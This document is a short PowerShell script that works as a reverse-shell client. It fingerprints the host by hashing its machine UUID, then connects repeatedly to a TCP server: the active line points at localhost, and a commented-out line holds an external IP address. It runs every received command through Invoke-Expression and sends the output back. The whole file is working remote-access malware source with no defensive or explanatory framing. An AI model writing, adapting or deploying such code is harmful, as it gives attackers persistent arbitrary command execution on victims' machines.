using namespace System;
using namespace System.Management.Automation;
using namespace System.Net.Sockets;
using namespace System.Security.Cryptography;
using namespace System.Text;


function Send {
    param (
        $stream,
        $content
    )

    $len = [BitConverter]::GetBytes([int32] $content.Length);
    if ([BitConverter]::IsLittleEndian) {
        [Array]::Reverse($len);
    }
    $out = $len + $content;
    $stream.Write($out, 0, $out.Length);
}


# Get UUID of Windows machine. Random bytes for Linux.
try {
    $uuid = [Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
}
catch [CommandNotFoundException] {
    $uuid = [Encoding]::UTF8.GetBytes((Get-Random));
}

# Compute SHA-256 hash of $uuid.
$hasher = [HashAlgorithm]::Create("sha256");
$uuid_hash = $hasher.ComputeHash($uuid);

# Preallocate byte array of sensible size with zeroes.
[byte[]] $bytes = 0..65535 | ForEach-Object { 0 };

# Try to establish connection indefinitely until "exit" command is issued.
while (1) {

    # Attempt to establish connection to server. Retry every 3 seconds.
    try {
        $client = [TcpClient]::new("localhost", 5000); # 145.24.222.156", 5000);
    }
    catch [MethodInvocationException] {
        Start-Sleep -s 3;
        continue;
    }

    # Disable Nagle's algorithm.
    $client.NoDelay = 1;

    # Initialize network stream.
    $stream = $client.GetStream();

    # Send UUID hash as initial message.
    Send $stream $uuid_hash;

    # Keep session established.
    while (1) {

        # Read stream.
        $cmd = "";
        do {
            $in = $stream.Read($bytes, 0, $bytes.Length);
            $cmd += [Encoding]::ASCII.GetString($bytes, 0, $in);
        }
        while ($stream.DataAvailable);

        # Retry if there was nothing to read.
        if ($cmd -eq "") {
            Start-Sleep -Seconds 0.5;
            continue;
        }
        # Close socket and exit on "exit" command.
        if ($cmd -eq "exit") {
            $client.Close();
            exit 1;
        }

        # Run command.
        try {
            $result = Invoke-Expression $cmd 2>&1;
        }
        catch {
            # Capture errors.
            $result = $_;
        }
        $result = [Encoding]::UTF8.GetBytes(($result | Out-String));

        # Send response.
        Send $stream $result;
    }
}
